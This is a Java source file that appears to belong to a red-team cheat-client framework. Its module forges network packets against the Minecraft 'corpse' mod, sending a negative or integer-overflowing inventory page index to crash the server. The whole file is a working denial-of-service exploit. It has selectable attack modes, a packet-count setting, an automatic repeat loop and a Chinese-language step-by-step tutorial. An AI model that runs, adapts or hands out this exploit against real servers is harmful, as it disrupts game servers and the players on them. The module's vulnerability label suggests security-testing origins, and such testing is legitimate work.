package com.redblue.red.modules.corpse;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CORPSE-02: Negative Page Index Crash (DoS)
 *
 * Exploits VULN-02:
 *   MessageSwitchInventoryPage (index 0) reads an int `page` with no bounds check.
 *   Server computes `startIndex = page * 54`. Negative page yields negative startIndex,
 *   causing ArrayIndexOutOfBoundsException in LockedSlot / NonNullList.get().
 *   Integer overflow (e.g. page=Integer.MAX_VALUE/54+1) also wraps to negative.
 *
 * Prerequisite: Player must have a CorpseAdditionalContainer open (right-click a corpse
 *   entity that has additional items, or chain with CORPSE-01 history mode).
 *
 * Wire format (index 0 - MessageSwitchInventoryPage):
 *   writeByte(0) + writeInt(page)
 */
public class CORPSE02_PageCrash implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("corpse", "default");
    private static final int IDX_SWITCH_PAGE = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "攻击模式", "NEGATIVE",
                "NEGATIVE", "OVERFLOW", "CUSTOM"),
        ConfigParam.ofInt("custom_page", "自定义页码", -1,
                Integer.MIN_VALUE / 54, Integer.MAX_VALUE / 54)
                .visibleWhen("mode", "CUSTOM"),
        ConfigParam.ofInt("packet_count", "发包次数", 1, 1, 50),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 10, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "corpse02_page_crash"; }
    @Override public String name() { return "页码越界崩溃"; }
    @Override public String description() { return "发送非法页码导致服务端容器异常"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 先打开一个尸体的附加物品GUI(右键尸体实体)\n"
            + "2. 选择攻击模式并点击执行\n\n"
            + "[攻击模式]\n"
            + "NEGATIVE — page=-1, startIndex=-54, 触发数组越界\n"
            + "OVERFLOW — page=39768216, 整数溢出为负值\n"
            + "CUSTOM — 自定义页码值\n\n"
            + "[前置条件]\n"
            + "必须已打开CorpseAdditionalContainer(尸体附加物品界面)";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("corpse");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int count = getParam("packet_count").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < count; i++) {
            sendPage();
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(10);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }

    private void sendPage() {
        int page = resolvePageValue();
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SWITCH_PAGE);
            buf.writeInt(page);
        });
    }

    private int resolvePageValue() {
        String mode = getParam("mode").map(ConfigParam::getString).orElse("NEGATIVE");
        switch (mode) {
            case "NEGATIVE":
                return -1;
            case "OVERFLOW":
                // 39768216 * 54 = 2,147,483,664 which overflows int to -2,147,483,632
                return 39768216;
            case "CUSTOM":
                return getParam("custom_page").map(ConfigParam::getInt).orElse(-1);
            default:
                return -1;
        }
    }
}
